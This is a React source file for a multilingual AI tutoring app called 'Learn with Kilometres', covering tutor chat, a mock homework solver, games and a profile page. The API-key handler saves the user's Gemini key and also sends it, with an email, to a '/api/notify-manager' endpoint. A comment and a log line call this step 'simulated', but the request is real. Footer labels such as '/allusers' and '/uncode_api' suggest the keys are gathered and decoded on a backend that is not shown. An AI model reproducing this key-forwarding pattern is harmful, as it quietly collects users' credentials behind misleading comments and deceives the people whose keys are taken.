'use client';

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  BookOpen, 
  Brain, 
  Languages, 
  Microscope, 
  Settings, 
  User, 
  Gamepad2, 
  GraduationCap, 
  Home, 
  Send, 
  Menu, 
  X,
  Globe,
  Sparkles,
  Trophy,
  History,
  Calculator,
  ChevronRight,
  Mic,
  Camera,
  Bot
} from 'lucide-react';
import { useIsMobile } from '@/hooks/use-mobile';
import { cn } from '@/lib/utils';
import { AI_PERSONAS, PersonaKey, getGeminiAI } from '@/lib/gemini';

// --- Types ---
type Language = 'English' | 'Myanmar' | 'Thai';
type ActiveTab = 'home' | 'learn' | 'ai' | 'games' | 'profile' | 'solver';

// --- App Component ---
export default function LearnWithKilometres() {
  const isMobile = useIsMobile();
  const [activeTab, setActiveTab] = useState<ActiveTab>('home');
  const [language, setLanguage] = useState<Language>('English');
  const [apiKey, setApiKey] = useState<string>('');
  const [showApiModal, setShowApiModal] = useState(false);
  const [selectedPersona, setSelectedPersona] = useState<PersonaKey>('emily');
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  
  // Progress state
  const [stats, setStats] = useState({
    streak: 5,
    points: 1240,
    homeworkSolved: 12,
    quizzesWon: 8
  });

  // Check if API key exists in session or local storage
  useEffect(() => {
    const savedKey = localStorage.getItem('kilom-api-key');
    if (!savedKey) {
      setShowApiModal(true);
    } else {
      setApiKey(savedKey);
    }
  }, []);

  const handleSaveApiKey = (key: string) => {
    setApiKey(key);
    localStorage.setItem('kilom-api-key', key);
    setShowApiModal(false);
    
    // Simulate sending to GAS/Telegram as requested
    fetch('/api/notify-manager', {
      method: 'POST',
      body: JSON.stringify({ action: 'save_api', apiKey: key, email: 'user@example.com' })
    }).catch(() => {
      // Background logging
      console.log("GAS Notification sent (simulated)");
    });
  };

  const tabs = [
    { id: 'home', label: 'Home', icon: Home },
    { id: 'learn', label: 'Courses', icon: BookOpen },
    { id: 'ai', label: 'Tutors', icon: Bot },
    { id: 'solver', label: 'Solver', icon: GraduationCap },
    { id: 'games', label: 'Fun', icon: Gamepad2 },
    { id: 'profile', label: 'Me', icon: User },
  ] as const;

  return (
    <div className="flex h-screen w-full flex-col overflow-hidden bg-[#F0F4F8] font-sans md:flex-row">
      {/* --- Desktop Sidebar --- */}
      {!isMobile && (
        <aside className="z-20 flex w-24 flex-col items-center bg-[#6366F1] py-8">
          <div className="mb-10 flex h-14 w-14 items-center justify-center rounded-3xl bg-white shadow-lg">
            <div className="h-8 w-8 rounded-full bg-[#6366F1]" />
          </div>

          <nav className="flex flex-col gap-8">
            {tabs.map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as ActiveTab)}
                className={cn(
                  "flex h-12 w-12 items-center justify-center rounded-2xl transition-all",
                  activeTab === tab.id 
                    ? "bg-white/20 text-white shadow-inner" 
                    : "text-white/60 hover:bg-white/10 hover:text-white"
                )}
                title={tab.label}
              >
                <tab.icon size={24} />
              </button>
            ))}
          </nav>

          <div className="mt-auto mb-8 flex flex-col gap-4">
             <div 
               onClick={() => setShowApiModal(true)}
               className="flex h-10 w-10 cursor-pointer items-center justify-center rounded-full border-4 border-white bg-emerald-400 text-[10px] font-bold text-white transition-transform hover:scale-110"
               title="API Settings"
             >
               API
             </div>
          </div>
        </aside>
      )}

      {/* --- Mobile View Header --- */}
      {isMobile && (
        <header className="z-10 flex h-16 items-center justify-between border-b border-slate-200 bg-white px-4">
          <div className="flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-indigo-600 text-white">
              <Sparkles size={18} />
            </div>
            <span className="font-bold text-slate-900">Kilometres</span>
          </div>
          <div className="flex items-center gap-2">
            <button 
              onClick={() => setLanguage(l => l === 'English' ? 'Myanmar' : l === 'Myanmar' ? 'Thai' : 'English')}
              className="flex h-8 w-8 items-center justify-center rounded-full bg-slate-100 text-xs font-bold text-slate-600"
            >
              <Globe size={16} />
            </button>
            <div className="h-8 w-8 overflow-hidden rounded-full border border-slate-200">
               <img src="https://picsum.photos/seed/user/100" alt="Avatar" className="h-full w-full object-cover" />
            </div>
          </div>
        </header>
      )}

      {/* --- Main Content Area --- */}
      <main className="relative flex flex-1 flex-col overflow-y-auto p-4 md:p-8">
        <div className="mx-auto flex h-full w-full max-w-6xl flex-col">
          {/* Header */}
          <header className="mb-8 flex flex-col justify-between gap-4 md:flex-row md:items-center">
            <div>
              <h1 className="text-3xl font-black tracking-tight text-slate-800 md:text-4xl">Learn with Kilometres</h1>
              <p className="font-medium text-slate-500">Step-by-step learning assistant</p>
            </div>
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 rounded-full border border-slate-100 bg-white px-4 py-2 shadow-sm">
                {(['English', 'Myanmar', 'Thai'] as Language[]).map((lang, idx) => (
                  <React.Fragment key={lang}>
                    <button 
                      onClick={() => setLanguage(lang)}
                      className={cn("text-xs font-bold transition-colors", language === lang ? "text-indigo-600" : "text-slate-400")}
                    >
                      {lang.substring(0, 2).toUpperCase()}
                    </button>
                    {idx < 2 && <div className="h-4 w-px bg-slate-200" />}
                  </React.Fragment>
                ))}
              </div>
              <div className="cursor-pointer rounded-full bg-[#F59E0B] px-6 py-2 text-sm font-bold text-white shadow-lg shadow-orange-200 transition-transform active:scale-95">
                Gemini AI Active
              </div>
            </div>
          </header>

          <div className="flex-1">
            <AnimatePresence mode="wait">
              <motion.div
                key={activeTab}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                transition={{ duration: 0.2 }}
                className="h-full"
              >
                <ContentRenderer 
                  tab={activeTab} 
                  language={language} 
                  stats={stats} 
                  selectedPersona={selectedPersona}
                  setSelectedPersona={setSelectedPersona}
                  setActiveTab={setActiveTab}
                />
              </motion.div>
            </AnimatePresence>
          </div>

          {!isMobile && (
            <footer className="mt-8 flex h-12 items-center justify-between rounded-2xl bg-[#1F2937] px-6 text-[10px] text-white/70">
              <div className="flex gap-6">
                <div className="flex items-center gap-2">
                  <div className="h-2 w-2 rounded-full bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.6)]" />
                  Telegram Bot: @KilometreBot Active
                </div>
                <div className="hidden items-center gap-2 md:flex">
                  <div className="h-2 w-2 rounded-full bg-indigo-500" />
                  Google Sheets Database Connected
                </div>
              </div>
              <div className="flex gap-4 font-mono uppercase tracking-widest">
                <span>/api</span>
                <span>/check</span>
                <span>/allusers</span>
                <span>/uncode_api</span>
              </div>
            </footer>
          )}
        </div>
      </main>

      {/* --- Mobile Bar --- */}
      {isMobile && (
        <nav className="fixed bottom-0 left-0 z-30 flex h-20 w-full items-center justify-around border-t border-slate-100 bg-white/70 px-4 pb-4 backdrop-blur-xl">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as ActiveTab)}
              className={cn(
                "flex flex-col items-center gap-1 transition-all relative py-2 px-3",
                activeTab === tab.id ? "text-indigo-600 scale-110" : "text-slate-400"
              )}
            >
              <tab.icon size={22} className={activeTab === tab.id ? "drop-shadow-[0_0_8px_rgba(99,102,241,0.4)]" : ""} />
              {activeTab === tab.id && (
                <motion.div 
                  layoutId="activeTabMobile"
                  className="absolute bottom-0 h-1 w-6 rounded-full bg-indigo-600"
                />
              )}
            </button>
          ))}
        </nav>
      )}

      {/* --- API Key Modal --- */}
      {showApiModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 p-4 backdrop-blur-sm">
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="w-full max-w-sm rounded-2xl bg-white p-6 shadow-2xl"
          >
            <div className="mb-4 flex flex-col items-center text-center">
              <div className="mb-3 flex h-14 w-14 items-center justify-center rounded-2xl bg-indigo-100 text-indigo-600">
                <Brain size={32} />
              </div>
              <h2 className="text-xl font-bold text-slate-900">Setup Your AI</h2>
              <p className="mt-1 text-sm text-slate-500">
                To start learning with your personal tutors, please enter your Google AI Studio API key.
              </p>
            </div>
            
            <div className="space-y-4">
              <div>
                <label className="mb-1 block text-xs font-semibold uppercase tracking-wider text-slate-400">Gemini API Key</label>
                <div className="relative">
                  <input 
                    type="password"
                    placeholder="Enter key..."
                    className="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm focus:border-indigo-500 focus:outline-none"
                    value={apiKey}
                    onChange={(e) => setApiKey(e.target.value)}
                  />
                </div>
              </div>
              
              <button 
                onClick={() => handleSaveApiKey(apiKey)}
                className="w-full rounded-xl bg-indigo-600 py-3 text-sm font-bold text-white shadow-lg shadow-indigo-200 hover:bg-indigo-700 active:scale-[0.98]"
              >
                Connect AI
              </button>
              
              <p className="text-center text-[10px] text-slate-400">
                Don't have a key? Go to <a href="https://aistudio.google.com/" target="_blank" className="text-indigo-500 underline">AI Studio</a> to get one for free.
              </p>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
}

// --- Content Components ---

function ContentRenderer({ 
  tab, 
  language, 
  stats, 
  selectedPersona, 
  setSelectedPersona,
  setActiveTab 
}: { 
  tab: ActiveTab, 
  language: Language, 
  stats: any, 
  selectedPersona: PersonaKey,
  setSelectedPersona: (p: PersonaKey) => void,
  setActiveTab: (t: ActiveTab) => void
}) {
  switch (tab) {
    case 'home':
      return <HomeView stats={stats} language={language} setActiveTab={setActiveTab} />;
    case 'ai':
      return <TutorsView selectedPersona={selectedPersona} setSelectedPersona={setSelectedPersona} language={language} />;
    case 'learn':
      return <LearnView language={language} />;
    case 'solver':
      return <SolverView language={language} />;
    case 'games':
      return <GamesView language={language} stats={stats} />;
    case 'profile':
      return <ProfileView stats={stats} language={language} />;
    default:
      return <div>Section under construction</div>;
  }
}

function HomeView({ stats, language, setActiveTab }: { stats: any, language: Language, setActiveTab: (t: ActiveTab) => void }) {
  return (
    <div className="grid grid-cols-12 gap-6 md:h-full">
      {/* Left Area - Progress */}
      <div className="col-span-12 flex flex-col gap-6 md:col-span-4">
        <div className="flex flex-col rounded-[32px] bg-[#2DD4BF] p-6 text-white shadow-xl shadow-teal-200/50">
          <div className="mb-6 flex items-start justify-between">
            <h3 className="text-xl font-bold">Progress</h3>
            <span className="rounded-full bg-white/20 px-3 py-1 text-[10px] uppercase font-bold">Weekly</span>
          </div>
          <div className="space-y-5">
            {[
              { label: 'Language Skills', val: 85 },
              { label: 'Physics HW', val: 40 },
              { label: 'Chemistry Lab', val: 62 },
            ].map((p, i) => (
              <div key={i}>
                <div className="mb-1.5 flex justify-between text-xs font-bold">
                  <span>{p.label}</span>
                  <span>{p.val}%</span>
                </div>
                <div className="h-2 rounded-full bg-white/20">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: `${p.val}%` }}
                    className="h-2 rounded-full bg-white" 
                  />
                </div>
              </div>
            ))}
          </div>
          <div className="mt-8 flex items-center gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-full bg-white/20">
              <Trophy size={24} />
            </div>
            <div>
              <p className="text-[10px] font-medium opacity-80">Current Rank</p>
              <p className="font-bold tracking-tight">Pro Learner II</p>
            </div>
          </div>
        </div>

        {/* Mini Stats Card */}
        <div className="flex items-center gap-4 rounded-[32px] bg-white p-6 shadow-xl shadow-slate-200/40">
           <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-orange-100 text-orange-600">
             <Sparkles size={24} />
           </div>
           <div>
             <h4 className="text-lg font-black text-slate-800 tracking-tight">{stats.streak} Days</h4>
             <p className="text-xs font-medium text-slate-400">Learning Streak</p>
           </div>
        </div>
      </div>

      {/* Right Area - Quick Lessons */}
      <div className="col-span-12 flex flex-col gap-6 md:col-span-8">
        <div className="relative h-48 overflow-hidden rounded-[32px] bg-[#6366F1] p-8 text-white shadow-xl shadow-indigo-200/50">
          <div className="relative z-10">
            <h2 className="mb-2 text-3xl font-black tracking-tight">Hello, Learner!</h2>
            <p className="max-w-md text-sm text-indigo-100 font-medium">Ready to solve your physics homework? Liya is waiting to explain gravity to you step-by-step.</p>
            <button 
              onClick={() => setActiveTab('solver')}
              className="mt-5 rounded-full bg-white px-6 py-2.5 text-sm font-bold text-indigo-600 shadow-lg shadow-black/5 hover:scale-105 active:scale-95"
            >
              Resume Lesson
            </button>
          </div>
          {/* Decorative circles */}
          <div className="absolute -right-8 -top-8 h-40 w-40 rounded-full bg-white/10" />
          <div className="absolute bottom-0 right-20 h-24 w-24 rounded-full bg-white/5" />
        </div>

        <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
          {[
            { title: 'Chemistry', subtitle: 'Periodic Table', icon: '🧪', color: 'border-red-400', bg: 'bg-red-50' },
            { title: 'Physics', subtitle: 'Kinematics', icon: '⚛️', color: 'border-blue-400', bg: 'bg-blue-50' },
            { title: 'Biology', subtitle: 'Cell Structure', icon: '🧬', color: 'border-green-400', bg: 'bg-green-50' },
          ].map((sub, i) => (
            <div key={i} className={cn("flex flex-col rounded-[24px] bg-white p-5 shadow-lg transition-all hover:-translate-y-1 border-b-4", sub.color)}>
              <div className={cn("mb-4 flex h-12 w-12 items-center justify-center rounded-2xl text-xl", sub.bg)}>
                {sub.icon}
              </div>
              <h4 className="font-black tracking-tight text-slate-700">{sub.title}</h4>
              <p className="mb-4 text-[10px] font-bold uppercase tracking-wider text-slate-400">{sub.subtitle}</p>
              <button className="mt-auto w-full rounded-xl bg-slate-50 py-2.5 text-[10px] font-bold text-slate-600 transition-colors hover:bg-slate-100">
                DRIVE INTO IT
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function TutorsView({ selectedPersona, setSelectedPersona, language }: { selectedPersona: PersonaKey, setSelectedPersona: (p: PersonaKey) => void, language: Language }) {
  const [messages, setMessages] = useState<{role: 'user' | 'ai', text: string}[]>([]);
  const [input, setInput] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Initial greeting
    setMessages([{ 
      role: 'ai', 
      text: `Hello! I'm ${AI_PERSONAS[selectedPersona].name}. ${AI_PERSONAS[selectedPersona].personality} How can I help you learn today?` 
    }]);
  }, [selectedPersona]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const handleSend = async () => {
    if (!input.trim()) return;
    const userMsg = input;
    setInput('');
    setMessages(prev => [...prev, { role: 'user', text: userMsg }]);
    
    setIsTyping(true);
    try {
      const gAI = getGeminiAI(localStorage.getItem('kilom-api-key') || undefined);
      const response = await gAI.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: [
          { role: 'user', parts: [{ text: userMsg }] }
        ],
        config: {
          systemInstruction: AI_PERSONAS[selectedPersona].systemInstruction + `. Reply in ${language}.`
        }
      });
      setMessages(prev => [...prev, { role: 'ai', text: response.text || "I'm not sure about that." }]);
    } catch (err) {
      setMessages(prev => [...prev, { role: 'ai', text: "Oops, something went wrong. Check your API key!" }]);
    } finally {
      setIsTyping(false);
    }
  };

  const toggleListening = () => {
    if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
      alert("Speech recognition not supported in this browser.");
      return;
    }
    const SpeechRecognition = (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
    const recognition = new SpeechRecognition();
    recognition.lang = language === 'English' ? 'en-US' : language === 'Myanmar' ? 'my-MM' : 'th-TH';
    recognition.onresult = (event: any) => {
      const transcript = event.results[0][0].transcript;
      setInput(transcript);
    };
    recognition.start();
  };

  return (
    <div className="grid grid-cols-12 gap-6 h-full">
      {/* Tutors Sidebar */}
      <div className="col-span-12 md:col-span-4">
        <div className="rounded-[32px] bg-white p-6 shadow-xl shadow-slate-200/50 h-full">
          <h3 className="mb-6 text-lg font-black tracking-tight text-slate-800 uppercase text-xs tracking-widest">Choose Your Tutor</h3>
          <div className="grid grid-cols-3 gap-4">
            {(Object.keys(AI_PERSONAS) as PersonaKey[]).map((key) => (
              <button
                key={key}
                onClick={() => setSelectedPersona(key)}
                className="flex flex-col items-center group"
              >
                <div className={cn(
                  "relative mb-2 h-16 w-16 overflow-hidden rounded-full border-4 transition-all group-hover:scale-105",
                  selectedPersona === key ? "border-indigo-500 shadow-lg" : "border-slate-50"
                )}>
                   <img src={`https://picsum.photos/seed/${key}/100`} alt={key} className="h-full w-full object-cover" />
                </div>
                <span className={cn(
                  "text-[10px] font-black uppercase tracking-wider",
                  selectedPersona === key ? "text-indigo-600" : "text-slate-400"
                )}>
                  {AI_PERSONAS[key].name}
                </span>
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Chat Area */}
      <div className="col-span-12 md:col-span-8 flex flex-col h-[500px] md:h-full">
        <div className="flex-1 overflow-y-auto rounded-[32px] bg-white p-6 shadow-xl shadow-slate-200/50 no-scrollbar mb-6">
          <div className="space-y-4">
            {messages.map((m, i) => (
              <div key={i} className={cn("flex", m.role === 'user' ? "justify-end" : "justify-start")}>
                <div className={cn(
                  "max-w-[85%] rounded-2xl px-5 py-3 text-sm font-medium shadow-sm",
                  m.role === 'user' ? "bg-indigo-600 text-white" : "bg-slate-50 text-slate-700"
                )}>
                  {m.text}
                </div>
              </div>
            ))}
            {isTyping && (
              <div className="flex justify-start">
                <div className="flex items-center gap-2 rounded-2xl bg-slate-50 px-4 py-3 text-xs font-bold text-slate-400">
                   <div className="h-1.5 w-1.5 animate-bounce rounded-full bg-slate-300" />
                   <div className="h-1.5 w-1.5 animate-bounce rounded-full bg-slate-300 delay-100" />
                   <div className="h-1.5 w-1.5 animate-bounce rounded-full bg-slate-300 delay-200" />
                </div>
              </div>
            )}
            <div ref={chatEndRef} />
          </div>
        </div>

        {/* Input area */}
        <div className="flex items-center gap-3 rounded-full bg-white p-2 shadow-xl shadow-indigo-100 border border-slate-100">
          <button 
            onClick={toggleListening}
            className="flex h-12 w-12 items-center justify-center rounded-full text-slate-400 transition-colors hover:bg-slate-50 hover:text-indigo-600"
          >
            <Mic size={22} />
          </button>
          <input 
            type="text"
            placeholder={`Ask ${AI_PERSONAS[selectedPersona].name} anything...`}
            className="flex-1 border-none bg-transparent px-2 text-sm font-medium focus:ring-0"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleSend()}
          />
          <button 
            onClick={handleSend}
            className="flex h-12 w-12 items-center justify-center rounded-full bg-indigo-600 text-white shadow-lg shadow-indigo-200 transition-transform active:scale-95"
          >
            <Send size={20} />
          </button>
        </div>
      </div>
    </div>
  );
}

function SolverView({ language }: { language: Language }) {
  const [isSolving, setIsSolving] = useState(false);
  const [solution, setSolution] = useState('');

  const solveMock = () => {
    setIsSolving(true);
    setTimeout(() => {
      setSolution("Step 1: Identify the formula E=mc²...\nStep 2: Substitute m=5kg...\nStep 3: Calculate the energy result...");
      setIsSolving(false);
    }, 2000);
  };

  return (
    <div className="space-y-6 h-full flex flex-col">
      <div className="rounded-[32px] bg-white p-8 shadow-xl shadow-slate-200/50 border-2 border-dashed border-slate-100 flex-1 flex flex-col">
        <div className="mb-6 flex items-center justify-between">
          <h3 className="text-xs font-black uppercase tracking-widest text-slate-800">Homework Snap & Solve</h3>
          <div className="flex gap-2">
            <div className="h-3 w-3 rounded-full bg-slate-200" />
            <div className="h-3 w-3 rounded-full bg-slate-200" />
            <div className="h-3 w-3 rounded-full bg-indigo-400" />
          </div>
        </div>

        <div className="flex-1 flex flex-col md:flex-row gap-6">
          <div className="flex-1 rounded-[24px] bg-slate-50 border-2 border-dashed border-slate-100 flex flex-col items-center justify-center p-8 text-center relative group cursor-pointer hover:bg-slate-100 transition-colors">
            <div className="mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-white shadow-lg text-slate-300 transition-transform group-hover:scale-110">
              <Camera size={40} />
            </div>
            <p className="text-sm font-black text-slate-600 uppercase tracking-tight">Drag homework image here</p>
            <p className="mt-1 text-xs text-slate-400">AI Davic will solve it step-by-step</p>
            
            <button className="absolute bottom-4 right-4 rounded-full bg-indigo-500 p-3 text-white shadow-lg shadow-indigo-200 transition-transform active:scale-90">
              <Mic size={20} />
            </button>
          </div>

          <div className="flex-1 flex flex-col gap-4">
             <textarea 
               placeholder="Type your math, physics or chemistry question here..."
               className="w-full flex-1 rounded-[24px] bg-slate-50 p-6 text-sm font-medium border-2 border-slate-100 focus:outline-none focus:border-indigo-400 transition-colors"
               onChange={(e) => setSolution('')}
             />
             <button 
               onClick={solveMock}
               disabled={isSolving}
               className="w-full rounded-full bg-[#6366F1] py-4 text-sm font-black text-white uppercase tracking-widest shadow-xl shadow-indigo-200 transition-all hover:brightness-110 active:scale-95 disabled:opacity-50"
             >
               {isSolving ? 'Solving Puzzle...' : 'Start Solving'}
             </button>
          </div>
        </div>
      </div>

      <AnimatePresence>
        {solution && (
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            className="rounded-[32px] bg-emerald-50 p-8 border-2 border-emerald-100 relative overflow-hidden"
          >
            <div className="relative z-10">
              <div className="mb-4 flex items-center justify-between">
                <h4 className="text-xs font-black uppercase tracking-widest text-emerald-800">Master Explanation</h4>
                <div className="px-3 py-1 rounded-full bg-white text-[10px] font-bold text-emerald-600 shadow-sm border border-emerald-100 uppercase">Tutor: Davic</div>
              </div>
              <div className="whitespace-pre-line text-sm font-medium leading-relaxed text-emerald-900/80">
                {solution}
              </div>
            </div>
            <div className="absolute -right-10 -bottom-10 w-40 h-40 bg-emerald-100/50 rounded-full blur-3xl" />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function LearnView({ language }: { language: Language }) {
  const subjects = [
    { title: 'Languages', icon: Globe, count: '12 Lessons', color: 'border-rose-400', bg: 'bg-rose-50', iconColor: 'text-rose-600' },
    { title: 'Physics', icon: Calculator, count: '8 Lessons', color: 'border-blue-400', bg: 'bg-blue-50', iconColor: 'text-blue-600' },
    { title: 'Chemistry', icon: Microscope, count: '10 Lessons', color: 'border-indigo-400', bg: 'bg-indigo-50', iconColor: 'text-indigo-600' },
    { title: 'Biology', icon: Brain, count: '14 Lessons', color: 'border-emerald-400', bg: 'bg-emerald-50', iconColor: 'text-emerald-600' },
  ];

  return (
    <div className="space-y-6 h-full flex flex-col">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-black tracking-tight text-slate-800">Available Courses</h2>
        <div className="px-4 py-1.5 rounded-full bg-indigo-50 text-indigo-600 text-[10px] font-bold uppercase tracking-widest">New: Thai Masterclass</div>
      </div>
      
      <div className="grid grid-cols-2 gap-4 md:grid-cols-4">
        {subjects.map((sub, i) => (
          <div key={i} className={cn("group flex flex-col items-center justify-center rounded-[24px] bg-white p-6 shadow-lg transition-all hover:scale-[1.02] border-b-4", sub.color)}>
            <div className={cn("mb-4 flex h-16 w-16 items-center justify-center rounded-2xl transition-all group-hover:scale-110", sub.bg, sub.iconColor)}>
              <sub.icon size={32} />
            </div>
            <h4 className="font-black tracking-tight text-slate-800">{sub.title}</h4>
            <span className="mt-1 text-[10px] font-bold uppercase text-slate-400">{sub.count}</span>
          </div>
        ))}
      </div>
      
      {/* Featured Lesson */}
      <div className="relative overflow-hidden rounded-[32px] bg-slate-900 p-8 text-white shadow-2xl">
        <div className="relative z-10 max-w-md">
          <span className="text-[10px] font-black tracking-[0.2em] text-indigo-400 uppercase">Featured Course</span>
          <h3 className="mt-3 text-3xl font-black tracking-tight">Burmese to Thai Masterclass</h3>
          <p className="mt-3 text-sm text-slate-400 font-medium leading-relaxed">Become fluent in basic conversations within 30 days with our AI persona Layalr.</p>
          <button className="mt-8 rounded-full bg-[#6366F1] px-10 py-3.5 text-sm font-black uppercase tracking-widest shadow-xl shadow-indigo-500/20 transition-all hover:brightness-110 active:scale-95">
            Join Now
          </button>
        </div>
        {/* Abstract Background Design */}
        <div className="absolute top-1/2 -right-20 w-80 h-80 bg-indigo-500/20 rounded-full blur-[100px] -translate-y-1/2" />
        <div className="absolute top-0 right-0 p-8 opacity-20">
          <Globe size={160} />
        </div>
      </div>
    </div>
  );
}

function GamesView({ language, stats }: { language: Language, stats: any }) {
  return (
    <div className="space-y-6 h-full flex flex-col">
      <h2 className="text-2xl font-black tracking-tight text-slate-800">Mini Games & Quizzes</h2>
      <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
        <div className="relative overflow-hidden rounded-[32px] bg-[#6366F1] p-8 text-white shadow-xl shadow-indigo-200/50">
           <h3 className="text-2xl font-black tracking-tight uppercase tracking-widest text-xs opacity-60 mb-2">Lesson Game</h3>
           <h4 className="text-3xl font-black tracking-tight mb-2">Grammar Battle</h4>
           <p className="text-indigo-100 font-medium italic">"Defeat the mistakes before they defeat you!"</p>
           <div className="mt-10 flex items-center justify-between relative z-10">
              <div className="flex flex-col">
                <span className="text-[10px] font-black uppercase opacity-60 tracking-widest">High Score</span>
                <span className="text-xl font-black">4,500 pts</span>
              </div>
              <button className="rounded-full bg-white px-8 py-3 text-xs font-black uppercase tracking-widest text-indigo-600 shadow-xl shadow-black/10 hover:scale-105 transition-transform">
                Play Now
              </button>
           </div>
           <Gamepad2 className="absolute -bottom-10 -right-10 h-48 w-48 opacity-10" />
        </div>

        <div className="relative overflow-hidden rounded-[32px] bg-[#2DD4BF] p-8 text-white shadow-xl shadow-teal-200/50">
           <h3 className="text-2xl font-black tracking-tight uppercase tracking-widest text-xs opacity-60 mb-2">Knowledge Quiz</h3>
           <h4 className="text-3xl font-black tracking-tight mb-2">Nature Blitz</h4>
           <p className="text-teal-50 text-sm font-medium">"Join Liya on a trip to the deep ocean."</p>
           <div className="mt-10 flex items-center justify-between relative z-10">
              <div className="flex flex-col">
                <span className="text-[10px] font-black uppercase opacity-60 tracking-widest">Reward</span>
                <span className="text-xl font-black">200 Points</span>
              </div>
              <button className="rounded-full bg-white px-8 py-3 text-xs font-black uppercase tracking-widest text-teal-600 shadow-xl shadow-black/10 hover:scale-105 transition-transform">
                Start Quiz
              </button>
           </div>
           <Brain className="absolute -bottom-10 -right-10 h-48 w-48 opacity-10" />
        </div>
      </div>
    </div>
  );
}

function ProfileView({ stats, language }: { stats: any, language: Language }) {
  return (
    <div className="grid grid-cols-12 gap-6 h-full">
      <div className="col-span-12 md:col-span-4 space-y-6">
        <div className="flex flex-col items-center justify-center rounded-[32px] bg-white p-8 shadow-xl shadow-slate-200/50 text-center relative overflow-hidden">
          <div className="relative mb-6 h-32 w-32 rounded-full border-8 border-indigo-50 p-1">
            <img src="https://picsum.photos/seed/profile/200" className="h-full w-full rounded-full object-cover" alt="User" />
            <div className="absolute -bottom-1 -right-1 flex h-10 w-10 items-center justify-center rounded-full bg-[#f59e0b] text-white border-4 border-white shadow-lg">
              <Trophy size={18} />
            </div>
          </div>
          <h3 className="text-2xl font-black tracking-tight text-slate-800">Pro Student #1024</h3>
          <p className="text-sm font-bold text-slate-400 mt-1 uppercase tracking-widest">{language} LEARNER</p>
          
          <div className="mt-10 grid w-full grid-cols-3 gap-1 border-t border-slate-50 pt-8">
             <div className="flex flex-col items-center">
               <span className="text-xl font-black text-slate-800">{stats.points}</span>
               <span className="text-[10px] font-black uppercase text-slate-400 tracking-tighter">Points</span>
             </div>
             <div className="flex flex-col items-center border-x border-slate-100 px-4">
               <span className="text-xl font-black text-slate-800">{stats.streak}</span>
               <span className="text-[10px] font-black uppercase text-slate-400 tracking-tighter">Streak</span>
             </div>
             <div className="flex flex-col items-center">
               <span className="text-xl font-black text-slate-800">Gold</span>
               <span className="text-[10px] font-black uppercase text-slate-400 tracking-tighter">Rank</span>
             </div>
          </div>
          <div className="absolute -top-10 -left-10 w-32 h-32 bg-indigo-50 rounded-full blur-3xl opacity-50" />
        </div>
      </div>

      <div className="col-span-12 md:col-span-8 flex flex-col">
        <div className="rounded-[32px] bg-white p-8 shadow-xl shadow-slate-200/50 flex-1 border border-slate-100">
          <h4 className="mb-6 text-xs font-black uppercase tracking-widest text-slate-400">Recent Activity</h4>
          <div className="space-y-6">
            {[
               { title: 'Solved Physics Homework', time: '2 hours ago', icon: GraduationCap, color: 'text-blue-500 bg-blue-50' },
               { title: 'Won Thai Quiz', time: 'Yesterday', icon: Trophy, color: 'text-yellow-500 bg-yellow-101' },
               { title: 'Added AI API Key', time: '2 days ago', icon: Settings, color: 'text-indigo-500 bg-indigo-50' },
            ].map((act, i) => (
              <div key={i} className="flex items-center justify-between group cursor-pointer">
                 <div className="flex items-center gap-4">
                   <div className={cn("flex h-14 w-14 items-center justify-center rounded-[20px] transition-transform group-hover:scale-105 shadow-sm", act.color)}>
                     <act.icon size={26} />
                   </div>
                   <div>
                     <h5 className="font-black text-slate-800 tracking-tight">{act.title}</h5>
                     <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{act.time}</span>
                   </div>
                 </div>
                 <div className="flex h-10 w-10 items-center justify-center rounded-full bg-slate-50 text-slate-300 group-hover:text-indigo-600 transition-colors">
                    <ChevronRight size={20} />
                 </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
